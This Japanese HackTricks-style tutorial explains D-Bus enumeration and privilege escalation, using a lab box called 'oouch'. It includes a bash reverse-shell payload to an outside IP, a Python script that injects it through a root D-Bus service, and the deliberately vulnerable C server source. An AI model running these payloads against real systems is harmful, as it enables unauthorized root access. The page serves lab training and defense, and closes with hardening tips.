# D-Bus Enumeration & Command Injection Privilege Escalation

{{#include ../../banners/hacktricks-training.md}}

## **GUI enumeration**

D-Bus は Ubuntu デスクトップ環境におけるプロセス間通信 (IPC) の仲介役として利用される。Ubuntu では、複数のメッセージバスが同時に動作している。主に **privileged services がシステム全体に関連するサービスを公開する** system bus と、ログイン中の各ユーザーごとの session bus であり、それぞれその特定ユーザーにのみ関連するサービスを公開する。ここでは、より高い権限（例: root）で動作するサービスに関連し、権限昇格が目的であるため、主に system bus に注目する。D-Bus のアーキテクチャでは、各 session bus ごとに 'router' が用いられており、クライアントが通信したい service に対して指定した address に基づいて、クライアントメッセージを適切な services に転送する役割を担うことが記されている。

D-Bus 上の services は、それらが公開する **objects** と **interfaces** によって定義される。objects は、標準的な OOP 言語における class instance に例えられ、各 instance は **object path** によって一意に識別される。この path は filesystem path に似ており、service が公開する各 object を一意に識別する。調査目的で重要な interface は **org.freedesktop.DBus.Introspectable** interface であり、単一の method である Introspect を備えている。この method は object がサポートする methods、signals、properties の XML 表現を返すが、ここでは properties と signals を省き、methods に焦点を当てる。

D-Bus interface との通信には 2 つの tool を使用した。1つは scripts 内で D-Bus が公開する methods を簡単に呼び出すための CLI tool **gdbus**、もう1つは [**D-Feet**](https://wiki.gnome.org/Apps/DFeet) で、各 bus 上で利用可能な services を列挙し、各 service に含まれる objects を表示するよう設計された Python ベースの GUI tool である。
```bash
sudo apt-get install d-feet
```
**session bus** を確認している場合は、まず現在のアドレスを確認してください:
```bash
echo "$DBUS_SESSION_BUS_ADDRESS"
```
![https://unit42.paloaltonetworks.com/wp-content/uploads/2019/07/word-image-21.png](https://unit42.paloaltonetworks.com/wp-content/uploads/2019/07/word-image-21.png)

![https://unit42.paloaltonetworks.com/wp-content/uploads/2019/07/word-image-22.png](https://unit42.paloaltonetworks.com/wp-content/uploads/2019/07/word-image-22.png)

最初の画像では、D-Bus system bus に登録された services が表示されており、System Bus ボタンを選択した後に **org.debin.apt** が特に強調表示されています。D-Feet はこの service に対して objects を query し、2枚目の画像で示されているように、選択した objects の interfaces、methods、properties、signals を表示します。各 method の signature も詳しく示されます。

注目すべき点として、service の **process ID (pid)** と **command line** が表示されます。これは、その service が権限昇格した状態で実行されているかを確認するのに役立ち、調査の関連性にとって重要です。

**D-Feet は method invocation も可能**です。ユーザーは parameters として Python expressions を入力でき、D-Feet はそれを D-Bus types に変換してから service に渡します。

ただし、**一部の methods では invocation を許可する前に authentication が必要**です。まず credentials なしで権限を昇格させることが目的なので、これらの methods は無視します。

また、一部の services は、ユーザーが特定の actions を実行してよいかどうかを、org.freedeskto.PolicyKit1 という別の D-Bus service に問い合わせます。

## **Cmd line Enumeration**

### List Service Objects

次のように、開いている D-Bus interfaces を list できます:
```bash
busctl list #List D-Bus interfaces

NAME                                   PID PROCESS         USER             CONNECTION    UNIT                      SE
:1.0                                     1 systemd         root             :1.0          init.scope                -
:1.1345                              12817 busctl          qtc              :1.1345       session-729.scope         72
:1.2                                  1576 systemd-timesyn systemd-timesync :1.2          systemd-timesyncd.service -
:1.3                                  2609 dbus-server     root             :1.3          dbus-server.service       -
:1.4                                  2606 wpa_supplicant  root             :1.4          wpa_supplicant.service    -
:1.6                                  2612 systemd-logind  root             :1.6          systemd-logind.service    -
:1.8                                  3087 unattended-upgr root             :1.8          unattended-upgrades.serv… -
:1.820                                6583 systemd         qtc              :1.820        user@1000.service         -
com.ubuntu.SoftwareProperties            - -               -                (activatable) -                         -
fi.epitest.hostap.WPASupplicant       2606 wpa_supplicant  root             :1.4          wpa_supplicant.service    -
fi.w1.wpa_supplicant1                 2606 wpa_supplicant  root             :1.4          wpa_supplicant.service    -
htb.oouch.Block                       2609 dbus-server     root             :1.3          dbus-server.service       -
org.bluez                                - -               -                (activatable) -                         -
org.freedesktop.DBus                     1 systemd         root             -             init.scope                -
org.freedesktop.PackageKit               - -               -                (activatable) -                         -
org.freedesktop.PolicyKit1               - -               -                (activatable) -                         -
org.freedesktop.hostname1                - -               -                (activatable) -                         -
org.freedesktop.locale1                  - -               -                (activatable) -                         -
```
**`(activatable)`** とマークされた Services は特に興味深いです。なぜなら、それらは **まだ起動していない** ものの、bus request によって必要に応じて起動されるからです。`busctl list` で止まらず、それらの名前を、実際に実行される binary に対応付けてください。
```bash
ls -la /usr/share/dbus-1/system-services/ /usr/share/dbus-1/services/ 2>/dev/null
grep -RInE '^(Name|Exec|User)=' /usr/share/dbus-1/system-services /usr/share/dbus-1/services 2>/dev/null
```
それにより、activatable name に対してどの `Exec=` path がどの identity で起動するかをすぐに把握できます。binary またはその execution chain の保護が弱い場合、inactive service でも privilege-escalation path になり得ます。

#### Connections

[From wikipedia:](https://en.wikipedia.org/wiki/D-Bus) プロセスが bus への connection を設定すると、bus はその connection に _unique connection name_ と呼ばれる特別な bus name を割り当てます。この種の bus names は immutable です—接続が存在する限り変わらないことが保証されており—、さらに重要なことに、bus lifetime の間は再利用できません。つまり、同じ process が bus への connection を閉じて新しいものを作成しても、その bus に対する他の connection にこの unique connection name が割り当てられることはありません。Unique connection names は、通常は禁止されているコロン文字で始まるため、簡単に見分けられます。

### Service Object Info

Then, you can obtain some information about the interface with:
```bash
busctl status htb.oouch.Block #Get info of "htb.oouch.Block" interface

PID=2609
PPID=1
TTY=n/a
UID=0
EUID=0
SUID=0
FSUID=0
GID=0
EGID=0
SGID=0
FSGID=0
SupplementaryGIDs=
Comm=dbus-server
CommandLine=/root/dbus-server
Label=unconfined
CGroup=/system.slice/dbus-server.service
Unit=dbus-server.service
Slice=system.slice
UserUnit=n/a
UserSlice=n/a
Session=n/a
AuditLoginUID=n/a
AuditSessionID=n/a
UniqueName=:1.3
EffectiveCapabilities=cap_chown cap_dac_override cap_dac_read_search
cap_fowner cap_fsetid cap_kill cap_setgid
cap_setuid cap_setpcap cap_linux_immutable cap_net_bind_service
cap_net_broadcast cap_net_admin cap_net_raw cap_ipc_lock
cap_ipc_owner cap_sys_module cap_sys_rawio cap_sys_chroot
cap_sys_ptrace cap_sys_pacct cap_sys_admin cap_sys_boot
cap_sys_nice cap_sys_resource cap_sys_time cap_sys_tty_config
cap_mknod cap_lease cap_audit_write cap_audit_control
cap_setfcap cap_mac_override cap_mac_admin cap_syslog
cap_wake_alarm cap_block_suspend cap_audit_read
PermittedCapabilities=cap_chown cap_dac_override cap_dac_read_search
cap_fowner cap_fsetid cap_kill cap_setgid
cap_setuid cap_setpcap cap_linux_immutable cap_net_bind_service
cap_net_broadcast cap_net_admin cap_net_raw cap_ipc_lock
cap_ipc_owner cap_sys_module cap_sys_rawio cap_sys_chroot
cap_sys_ptrace cap_sys_pacct cap_sys_admin cap_sys_boot
cap_sys_nice cap_sys_resource cap_sys_time cap_sys_tty_config
cap_mknod cap_lease cap_audit_write cap_audit_control
cap_setfcap cap_mac_override cap_mac_admin cap_syslog
cap_wake_alarm cap_block_suspend cap_audit_read
InheritableCapabilities=
BoundingCapabilities=cap_chown cap_dac_override cap_dac_read_search
cap_fowner cap_fsetid cap_kill cap_setgid
cap_setuid cap_setpcap cap_linux_immutable cap_net_bind_service
cap_net_broadcast cap_net_admin cap_net_raw cap_ipc_lock
cap_ipc_owner cap_sys_module cap_sys_rawio cap_sys_chroot
cap_sys_ptrace cap_sys_pacct cap_sys_admin cap_sys_boot
cap_sys_nice cap_sys_resource cap_sys_time cap_sys_tty_config
cap_mknod cap_lease cap_audit_write cap_audit_control
cap_setfcap cap_mac_override cap_mac_admin cap_syslog
cap_wake_alarm cap_block_suspend cap_audit_read
```
また、バス名をその `systemd` unit と executable path に関連付けます:
```bash
systemctl status dbus-server.service --no-pager
systemctl cat dbus-server.service
namei -l /root/dbus-server
```
これは、privesc 中に重要となる運用上の疑問に答えるものです: **あるメソッド呼び出しが成功した場合、どの実体バイナリと unit がその動作を実行するのか?**

### サービスオブジェクトのインターフェースを列挙する

十分な権限が必要です。
```bash
busctl tree htb.oouch.Block #Get Interfaces of the service object

└─/htb
└─/htb/oouch
└─/htb/oouch/Block
```
### Service Object の Interface を Introspect する

この例では、`tree` パラメータを使って発見された最新の interface が選択されていることに注意してください（_前のセクションを参照_）：
```bash
busctl introspect htb.oouch.Block /htb/oouch/Block #Get methods of the interface

NAME                                TYPE      SIGNATURE RESULT/VALUE FLAGS
htb.oouch.Block                     interface -         -            -
.Block                              method    s         s            -
org.freedesktop.DBus.Introspectable interface -         -            -
.Introspect                         method    -         s            -
org.freedesktop.DBus.Peer           interface -         -            -
.GetMachineId                       method    -         s            -
.Ping                               method    -         -            -
org.freedesktop.DBus.Properties     interface -         -            -
.Get                                method    ss        v            -
.GetAll                             method    s         a{sv}        -
.Set                                method    ssv       -            -
.PropertiesChanged                  signal    sa{sv}as  -            -
```
インターフェース `htb.oouch.Block` のメソッド `.Block`（私たちが注目しているもの）に注目してください。他のカラムの "s" は、文字列を期待していることを意味しているのかもしれません。

危険なことを試す前に、まず **read-oriented** か、それ以外の低リスクなメソッドを検証してください。これにより、3つのケースを明確に切り分けられます: syntax が間違っている、到達可能だが denied、または到達可能で allowed。
```bash
busctl call org.freedesktop.login1 /org/freedesktop/login1 org.freedesktop.login1.Manager CanReboot
gdbus call --system --dest org.freedesktop.login1 --object-path /org/freedesktop/login1 --method org.freedesktop.login1.Manager.CanReboot
```
### D-Bus Methods を Policies と Actions に関連付ける

Introspection は、**何を**呼び出せるかは教えてくれますが、なぜその呼び出しが許可または禁止されるのかは教えてくれません。実際の privesc の切り分けでは、通常 **3つの層をまとめて** 調べる必要があります:

1. **Activation metadata** (`.service` files or `SystemdService=`) で、実際にどの binary と unit が実行されるかを知る。
2. **D-Bus XML policy** (`/etc/dbus-1/system.d/`, `/usr/share/dbus-1/system.d/`) で、誰が `own`, `send_destination`, `receive_sender` できるかを知る。
3. **Polkit action files** (`/usr/share/polkit-1/actions/*.policy`) で、デフォルトの authorization model (`allow_active`, `allow_inactive`, `auth_admin`, `auth_self`, `org.freedesktop.policykit.imply`) を知る。

便利なコマンド:
```bash
grep -RInE '^(Name|Exec|SystemdService|User)=' /usr/share/dbus-1/system-services /usr/share/dbus-1/services 2>/dev/null
grep -RInE '<(allow|deny) (own|send_destination|receive_sender)=|user=|group=' /etc/dbus-1/system.d /usr/share/dbus-1/system.d /etc/dbus-1/system-local.d 2>/dev/null
grep -RInE 'allow_active|allow_inactive|auth_admin|auth_self|org\.freedesktop\.policykit\.imply' /usr/share/polkit-1/actions 2>/dev/null
pkaction --verbose
```
D-Bus method と Polkit action を 1:1 で対応させると**仮定しないでください**。同じ method でも、変更される object や runtime context に応じて、別の action を選ぶことがあります。したがって、実用的な流れは次のとおりです。

1. `busctl introspect` / `gdbus introspect`
2. `pkaction --verbose` と関連する `.policy` ファイルの grep
3. `busctl call`、`gdbus call`、または `dbusmap --enable-probes --null-agent` を使った低リスクの live probe

proxy や compatibility service は特に注意が必要です。自前で事前に確立した connection を使って別の D-Bus service へ request を転送する **root-running proxy** は、元の caller identity が再検証されない限り、backend に各 request を UID 0 から来たものとして誤って扱わせる可能性があります。

### Monitor/Capture Interface

十分な privileges があれば（`send_destination` と `receive_sender` の privileges だけでは不十分です）、D-Bus communication を **monitor** できます。

communication を **monitor** するには **root** である必要があります。root であっても問題がある場合は、[https://piware.de/2013/09/how-to-watch-system-d-bus-method-calls/](https://piware.de/2013/09/how-to-watch-system-d-bus-method-calls/) と [https://wiki.ubuntu.com/DebuggingDBus](https://wiki.ubuntu.com/DebuggingDBus) を確認してください。

> [!WARNING]
> D-Bus config file を設定して non root users が communication を **sniff** できるようにする方法を知っている場合は、**連絡してください**！

monitor する方法は次のとおりです:
```bash
sudo busctl monitor htb.oouch.Block #Monitor only specified
sudo busctl monitor #System level, even if this works you will only see messages you have permissions to see
sudo dbus-monitor --system #System level, even if this works you will only see messages you have permissions to see
```
次の例では、interface `htb.oouch.Block` が監視されており、**message "**_**lalalalal**_**"** が miscommunication を通じて送信されます:
```bash
busctl monitor htb.oouch.Block

Monitoring bus message stream.
‣ Type=method_call  Endian=l  Flags=0  Version=1  Priority=0 Cookie=2
Sender=:1.1376  Destination=htb.oouch.Block  Path=/htb/oouch/Block  Interface=htb.oouch.Block  Member=Block
UniqueName=:1.1376
MESSAGE "s" {
STRING "lalalalal";
};

‣ Type=method_return  Endian=l  Flags=1  Version=1  Priority=0 Cookie=16  ReplyCookie=2
Sender=:1.3  Destination=:1.1376
UniqueName=:1.3
MESSAGE "s" {
STRING "Carried out :D";
};
```
`capture` を `monitor` の代わりに使うと、Wireshark で開ける **pcapng** ファイルに結果を保存できます:
```bash
sudo busctl capture htb.oouch.Block > dbus-htb.oouch.Block.pcapng
sudo busctl capture > system-bus.pcapng
```
#### ノイズをすべてフィルタリングする <a href="#filtering_all_the_noise" id="filtering_all_the_noise"></a>

bus上の情報が多すぎる場合は、次のようにmatch ruleを渡します:
```bash
dbus-monitor "type=signal,sender='org.gnome.TypingMonitor',interface='org.gnome.TypingMonitor'"
```
複数のルールを指定できます。メッセージがルールの _いずれか_ に一致した場合、そのメッセージが表示されます。以下のように:
```bash
dbus-monitor "type=error" "sender=org.freedesktop.SystemToolsBackends"
```

```bash
dbus-monitor "type=method_call" "type=method_return" "type=error"
```
詳しくは [D-Bus documentation](http://dbus.freedesktop.org/doc/dbus-specification.html) を参照してください。match rule syntax について説明されています。

### More

`busctl` にはさらに多くの options があります。[**すべてはこちら**](https://www.freedesktop.org/software/systemd/man/busctl.html)。

## **Vulnerable Scenario**

HTB の host "oouch" 上の user **qtc** として、_/etc/dbus-1/system.d/htb.oouch.Block.conf_ にある **unexpected D-Bus config file** を見つけることができます：
```xml
<?xml version="1.0" encoding="UTF-8"?> <!-- -*- XML -*- -->

<!DOCTYPE busconfig PUBLIC
"-//freedesktop//DTD D-BUS Bus Configuration 1.0//EN"
"http://www.freedesktop.org/standards/dbus/1.0/busconfig.dtd">

<busconfig>

<policy user="root">
<allow own="htb.oouch.Block"/>
</policy>

<policy user="www-data">
<allow send_destination="htb.oouch.Block"/>
<allow receive_sender="htb.oouch.Block"/>
</policy>

</busconfig>
```
前の設定に関する注意として、この D-BUS 通信経由で情報を送受信するには、ユーザー `root` または `www-data` である必要があります。

Docker コンテナ **aeb4525789d8** 内のユーザー **qtc** として、ファイル _/code/oouch/routes.py_ に dbus 関連のコードがいくつか見つかります。以下がその興味深いコードです:
```python
if primitive_xss.search(form.textfield.data):
bus = dbus.SystemBus()
block_object = bus.get_object('htb.oouch.Block', '/htb/oouch/Block')
block_iface = dbus.Interface(block_object, dbus_interface='htb.oouch.Block')

client_ip = request.environ.get('REMOTE_ADDR', request.remote_addr)
response = block_iface.Block(client_ip)
bus.close()
return render_template('hacker.html', title='Hacker')
```
ご覧のとおり、これは**D-Bus interface に接続**し、**"Block" function** に "client_ip" を送信しています。

D-Bus connection の反対側では、Cでコンパイルされたバイナリが実行されています。このコードは D-Bus connection で**IP address を待ち受け**、与えられたIP address をブロックするために `system` function 経由で iptables を呼び出しています。\
**`system` への call は command injection のために意図的に脆弱**なので、次のような payload で reverse shell を作成できます: `;bash -c 'bash -i >& /dev/tcp/10.10.14.44/9191 0>&1' #`

### Exploit it

このページの末尾で、**D-Bus application の完全な C code** を確認できます。その中の91-97行目の間で、**`D-Bus object path`** と **`interface name`** がどのように登録されているかがわかります。この情報は、D-Bus connection に情報を送信するために必要になります:
```c
/* Install the object */
r = sd_bus_add_object_vtable(bus,
&slot,
"/htb/oouch/Block",  /* interface */
"htb.oouch.Block",   /* service object */
block_vtable,
NULL);
```
また、57行目では、この D-Bus 通信で**登録されている唯一のメソッド**が `Block` と呼ばれていることがわかる（_**そのため、以下のセクションではペイロードは service object `htb.oouch.Block`、interface `/htb/oouch/Block`、method name `Block` に送信される**_）：
```c
SD_BUS_METHOD("Block", "s", "s", method_block, SD_BUS_VTABLE_UNPRIVILEGED),
```
#### Python

以下のpythonコードは、`block_iface.Block(runme)` を介して `Block` メソッドへ payload を D-Bus connection に送信します (_note that it was extracted from the previous chunk of code_):
```python
import dbus
bus = dbus.SystemBus()
block_object = bus.get_object('htb.oouch.Block', '/htb/oouch/Block')
block_iface = dbus.Interface(block_object, dbus_interface='htb.oouch.Block')
runme = ";bash -c 'bash -i >& /dev/tcp/10.10.14.44/9191 0>&1' #"
response = block_iface.Block(runme)
bus.close()
```
#### busctl and dbus-send
```bash
dbus-send --system --print-reply --dest=htb.oouch.Block /htb/oouch/Block htb.oouch.Block.Block string:';pring -c 1 10.10.14.44 #'
```
- `dbus-send` は “Message Bus” にメッセージを送るためのツールです
- Message Bus – アプリケーション間の通信を容易にするためにシステムで使われるソフトウェアです。Message Queue（メッセージが順番に並ぶ）に関連していますが、Message Bus ではメッセージは subscription model で送られ、さらに非常に高速です。
- “-system” タグは、それが session message ではなく system message であることを示すために使われます（デフォルト）。
- “–print-reply” タグは、メッセージを適切に表示し、受け取った reply を human-readable な形式で表示するために使われます。
- “–dest=Dbus-Interface-Block” Dbus interface のアドレスです。
- “–string:” – interface に送りたい message のタイプです。double、bytes、booleans、int、objpath など、メッセージ送信にはいくつかの形式があります。この中で “object path” は、ファイルの path を Dbus interface に送りたいときに便利です。この場合、特別なファイル（FIFO）を使って、ファイル名の形で interface に command を渡すことができます。“string:;” – これは object path を再度呼び出すためのもので、FIFO reverse shell の file/command を配置します。

_Note that in `htb.oouch.Block.Block`, the first part (`htb.oouch.Block`) references the service object and the last part (`.Block`) references the method name._

### C code
```c:d-bus_server.c
//sudo apt install pkgconf
//sudo apt install libsystemd-dev
//gcc d-bus_server.c -o dbus_server `pkg-config --cflags --libs libsystemd`

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <errno.h>
#include <unistd.h>
#include <systemd/sd-bus.h>

static int method_block(sd_bus_message *m, void *userdata, sd_bus_error *ret_error) {
char* host = NULL;
int r;

/* Read the parameters */
r = sd_bus_message_read(m, "s", &host);
if (r < 0) {
fprintf(stderr, "Failed to obtain hostname: %s\n", strerror(-r));
return r;
}

char command[] = "iptables -A PREROUTING -s %s -t mangle -j DROP";

int command_len = strlen(command);
int host_len = strlen(host);

char* command_buffer = (char *)malloc((host_len + command_len) * sizeof(char));
if(command_buffer == NULL) {
fprintf(stderr, "Failed to allocate memory\n");
return -1;
}

sprintf(command_buffer, command, host);

/* In the first implementation, we simply ran command using system(), since the expected DBus
* to be threading automatically. However, DBus does not thread and the application will hang
* forever if some user spawns a shell. Thefore we need to fork (easier than implementing real
* multithreading)
*/
int pid = fork();

if ( pid == 0 ) {
/* Here we are in the child process. We execute the command and eventually exit. */
system(command_buffer);
exit(0);
} else {
/* Here we are in the parent process or an error occured. We simply send a genric message.
* In the first implementation we returned separate error messages for success or failure.
* However, now we cannot wait for results of the system call. Therefore we simply return
* a generic. */
return sd_bus_reply_method_return(m, "s", "Carried out :D");
}
r = system(command_buffer);
}


/* The vtable of our little object, implements the net.poettering.Calculator interface */
static const sd_bus_vtable block_vtable[] = {
SD_BUS_VTABLE_START(0),
SD_BUS_METHOD("Block", "s", "s", method_block, SD_BUS_VTABLE_UNPRIVILEGED),
SD_BUS_VTABLE_END
};


int main(int argc, char *argv[]) {
/*
* Main method, registeres the htb.oouch.Block service on the system dbus.
*
* Paramaters:
*      argc            (int)             Number of arguments, not required
*      argv[]          (char**)          Argument array, not required
*
* Returns:
*      Either EXIT_SUCCESS ot EXIT_FAILURE. Howeverm ideally it stays alive
*      as long as the user keeps it alive.
*/


/* To prevent a huge numer of defunc process inside the tasklist, we simply ignore client signals */
signal(SIGCHLD,SIG_IGN);

sd_bus_slot *slot = NULL;
sd_bus *bus = NULL;
int r;

/* First we need to connect to the system bus. */
r = sd_bus_open_system(&bus);
if (r < 0)
{
fprintf(stderr, "Failed to connect to system bus: %s\n", strerror(-r));
goto finish;
}

/* Install the object */
r = sd_bus_add_object_vtable(bus,
&slot,
"/htb/oouch/Block",  /* interface */
"htb.oouch.Block",   /* service object */
block_vtable,
NULL);
if (r < 0) {
fprintf(stderr, "Failed to install htb.oouch.Block: %s\n", strerror(-r));
goto finish;
}

/* Register the service name to find out object */
r = sd_bus_request_name(bus, "htb.oouch.Block", 0);
if (r < 0) {
fprintf(stderr, "Failed to acquire service name: %s\n", strerror(-r));
goto finish;
}

/* Infinite loop to process the client requests */
for (;;) {
/* Process requests */
r = sd_bus_process(bus, NULL);
if (r < 0) {
fprintf(stderr, "Failed to process bus: %s\n", strerror(-r));
goto finish;
}
if (r > 0) /* we processed a request, try to process another one, right-away */
continue;

/* Wait for the next request to process */
r = sd_bus_wait(bus, (uint64_t) -1);
if (r < 0) {
fprintf(stderr, "Failed to wait on bus: %s\n", strerror(-r));
goto finish;
}
}

finish:
sd_bus_slot_unref(slot);
sd_bus_unref(bus);

return r < 0 ? EXIT_FAILURE : EXIT_SUCCESS;
}
```
## Automated Enumeration Helpers (2023-2025)

`busctl`/`gdbus` を使って大規模な D-Bus attack surface を手動で列挙するのは、すぐに大変になります。ここ数年で公開された小さな FOSS ユーティリティ 2 つが、red-team や CTF での作業を高速化できます:

### dbusmap ("Nmap for D-Bus")
* Author: @taviso – [https://github.com/taviso/dbusmap](https://github.com/taviso/dbusmap)
* C で書かれた単一の static binary (<50 kB) で、すべての object path を巡回し、`Introspect` XML を取得して、その所有 PID/UID にマッピングします。
* 便利な flags:
```bash
# *system* bus 上のすべての service を列挙し、呼び出し可能な method をすべてダンプする
sudo dbus-map --dump-methods

# Polkit プロンプトなしで到達できる method/property を能動的に probe する
sudo dbus-map --enable-probes --null-agent --dump-methods --dump-properties
```
* この tool は保護されていない well-known name に `!` を付け、すぐに *own*（take over）できる service や、権限のない shell から到達できる method call を明らかにします。

### uptux.py
* Author: @initstring – [https://github.com/initstring/uptux](https://github.com/initstring/uptux)
* systemd unit の *writable* path と、権限が広すぎる D-Bus policy file（例: `send_destination="*"`）を探す Python 専用スクリプトです。
* すばやい使い方:
```bash
python3 uptux.py -n          # すべての check を実行するが、log file は書き込まない
python3 uptux.py -d          # verbose な debug output を有効化する
```
* D-Bus module は以下の directory を検索し、通常ユーザーが spoof も hijack も可能な service を強調表示します:
* `/etc/dbus-1/system.d/` and `/usr/share/dbus-1/system.d/`
* `/etc/dbus-1/system-local.d/` (vendor overrides)

---

## Notable D-Bus Privilege-Escalation Bugs (2024-2025)

最近公開された CVE を追うことは、独自コードにある同様の insecure pattern を見つけるのに役立ちます。最近の良い例は 2 つあります:

| Year | CVE | Component | Root Cause | Offensive lesson |
|------|-----|-----------|------------|------------------|
| 2024 | CVE-2024-45752 | `logiops` ≤ 0.3.4 (`logid`) | root で動作する service が、権限のないユーザーでも再設定できる D-Bus interface を公開しており、攻撃者制御の macro behavior の読み込みまで可能だった。 | daemon が system bus 上で **device/profile/config management** を公開しているなら、書き込み可能な configuration や macro 機能は単なる "settings" ではなく、code-execution primitive として扱うこと。 |
| 2025 | CVE-2025-23222 | Deepin `dde-api-proxy` ≤ 1.0.19 | root で動作する compatibility proxy が、元の caller の security context を保持せずに request を backend service へ転送していたため、backend は proxy を UID 0 として信用していた。 | **proxy / bridge / compatibility** の D-Bus service は別の bug class として扱うこと: もし特権付き call を relay するなら、caller の UID/Polkit context が backend にどう届くかを確認する。 |

注目すべき pattern:
1. service が **root として system bus 上で** 動作する。
2. **authorization check がない**、または **間違った subject** に対して check している。
3. 到達可能な method が最終的に system state を変更する: package install、user/group 変更、bootloader config、device profile 更新、file write、または直接の command execution。

`dbusmap --enable-probes` か手動の `busctl call` を使って method に到達できるか確認し、その後 service の policy XML と Polkit action を調べて、実際に **どの subject** が authorization されているのかを理解してください。

---

## Hardening & Detection Quick-Wins

* world-writable か、*send/receive* が開放された policy を検索する:
```bash
grep -R --color -nE '<allow (own|send_destination|receive_sender)="[^"]*"' /etc/dbus-1/system.d /usr/share/dbus-1/system.d
```
* 危険な method には Polkit を必須にする – *root* proxy であっても、自身ではなく *caller* の PID を `polkit_authority_check_authorization_sync()` に渡すべきです。
* 長時間動作する helper では privilege を drop する（bus に接続した後、`sd_pid_get_owner_uid()` を使って namespace を切り替える）。
* service を削除できない場合でも、少なくとも専用の Unix group に *scope* し、XML policy で access を制限する。
* Blue-team: `busctl capture > /var/log/dbus_$(date +%F).pcapng` で system bus を capture し、Wireshark に import して anomaly detection に使う。

---

## References

- [https://unit42.paloaltonetworks.com/usbcreator-d-bus-privilege-escalation-in-ubuntu-desktop/](https://unit42.paloaltonetworks.com/usbcreator-d-bus-privilege-escalation-in-ubuntu-desktop/)
- [https://github.com/PixlOne/logiops/issues/473](https://github.com/PixlOne/logiops/issues/473)
- [https://security.opensuse.org/2025/01/24/dde-api-proxy-privilege-escalation.html](https://security.opensuse.org/2025/01/24/dde-api-proxy-privilege-escalation.html)
{{#include ../../banners/hacktricks-training.md}}
